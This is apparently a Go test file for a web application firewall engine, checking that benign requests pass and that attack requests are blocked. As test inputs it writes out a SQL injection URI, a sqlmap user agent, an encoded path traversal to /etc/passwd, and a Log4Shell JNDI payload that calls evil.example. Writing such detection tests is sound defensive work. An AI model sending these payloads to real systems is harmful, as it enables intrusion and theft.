package engine

import (
	"testing"

	"knight/internal/request"
)

func mkEngine(t *testing.T) *Engine {
	t.Helper()
	rules, err := LoadRules("../../rules/signatures.json")
	if err != nil {
		t.Fatalf("load rules: %v", err)
	}
	return New(rules, 10)
}

func eval(e *Engine, uri, ua string) Verdict {
	ctx := request.New("1.2.3.4", "GET", uri, ua, "", "", "")
	return e.Evaluate(ctx)
}

func TestBenignRequestPasses(t *testing.T) {
	e := mkEngine(t)
	v := eval(e, "/products?id=42&sort=price", "Mozilla/5.0")
	if v.Block || len(v.Matches) != 0 {
		t.Fatalf("benign request flagged: %+v", v)
	}
}

func TestSQLiUnionSelectBlocks(t *testing.T) {
	e := mkEngine(t)
	v := eval(e, "/item?id=1%20union%20select%20password%20from%20users", "curl")
	if !v.Block {
		t.Fatalf("expected block, got %+v", v)
	}
}

func TestScannerUserAgentBlocks(t *testing.T) {
	e := mkEngine(t)
	v := eval(e, "/", "sqlmap/1.7")
	if !v.Block {
		t.Fatalf("expected scanner UA to block, got %+v", v)
	}
}

func TestPathTraversalDetected(t *testing.T) {
	e := mkEngine(t)
	// %2e%2e%2f decodes to ../ during normalization.
	v := eval(e, "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", "Mozilla/5.0")
	if len(v.Matches) == 0 {
		t.Fatalf("expected traversal/sensitive-file match, got %+v", v)
	}
}

func TestLog4ShellBlocks(t *testing.T) {
	e := mkEngine(t)
	v := eval(e, "/", "${jndi:ldap://evil.example/a}")
	if !v.Block {
		t.Fatalf("expected log4shell block, got %+v", v)
	}
}
